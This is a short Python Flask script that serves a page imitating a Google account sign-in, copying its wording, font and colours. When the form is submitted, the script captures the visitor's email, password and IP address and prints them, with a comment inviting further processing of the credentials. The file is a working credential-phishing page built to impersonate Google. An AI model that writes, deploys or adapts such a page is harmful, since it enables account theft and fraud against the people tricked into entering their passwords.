from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']  # Get the email input
        password = request.form['password']  # Get the password input
        user_ip = request.remote_addr  # Get the user's IP address

        print(f"User Email: {email}")
        print(f"User Password: {password}")
        print(f"User IP: {user_ip}")

        # You can now process the email and password as needed

    return '''
    <div class="box">
        <h2>Sign in</h2>
        <p>Use your Google Account</p>
        <form method="POST">
            <div class="inputBox">
                <input type="text" name="email" id="email" placeholder="Email" required>
                <input type="password" name="password" placeholder="Password" id="password" required>
            </div>
            <input type="submit" value="Submit">
        </form>
    </div>

   <style>
   * {
  padding: 0;
  margin: 0;
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 0;
  background-size: cover;
  font-family: sans-serif;
}

.box {
  position: absolute;
  top: 50%;
  left: 50%;
  padding: 0.125rem;
  transform: translate(-50%, -50%);
  width: 25rem;
  box-sizing: border-box;
  border: 1px solid #dadce0;
  border-radius: 8px;
}

.box h2 {
  margin: 0 0 0.125rem;
  padding: 0;
  color: #fff;
  text-align: center;
  color: #202124;
  font-family: "Google Sans", sans-serif;
  font-size: 24px;
  font-weight: 400;
}

.box p {
  font-size: 16px;
  font-weight: 400;
  letter-spacing: 0.1px;
  line-height: 1.5;
  margin-bottom: 25px;
  text-align: center;
}

.box .inputBox {
  position: relative;
  margin-left: 1.76rem;
}

.box .inputBox input {
  width: 93%;
  padding: 0.625rem 10px;
  font-size: 1rem;
  letter-spacing: 0.062rem;
  margin-bottom: 1.875rem;
  border: 1px solid #ccc;
  background: transparent;
  border-radius: 4px;
}

.box .inputBox label {
  position: absolute;
  top: 0;
  left: 10px;
  padding: 0.625rem 0;
  font-size: 1rem;
  color: gray;
  pointer-events: none;
  transition: 0.5s;
}

.box .inputBox input:focus ~ label,
.box .inputBox input:valid ~ label,
.box .inputBox input:not([value=""]) ~ label {
  top: -1.125rem;
  left: 10px;
  color: #1a73e8;
  font-size: 0.75rem;
  background-color: #fff;
  height: 10px;
  padding-left: 5px;
  padding-right: 5px;
}

.box .inputBox input:focus {
  outline: none;
  border: 2px solid #1a73e8;
}

.box input[type="submit"] {
  margin-right: 1.76rem;
  margin-bottom: 2rem;
  border: none;
  outline: none;
  color: #fff;
  background-color: #1a73e8;
  padding: 0.625rem 1.25rem;
  cursor: pointer;
  border-radius: 0.312rem;
  font-size: 1rem;
  float: right;
}

.box input[type="submit"]:hover {
  background-color: #287ae6;
  box-shadow: 0 1px 1px 0 rgba(66, 133, 244, 0.45),
    0 1px 3px 1px rgba(66, 133, 244, 0.3);
}

   </style>
 </div>

    '''

if __name__ == '__main__':
    app.run(debug=True)
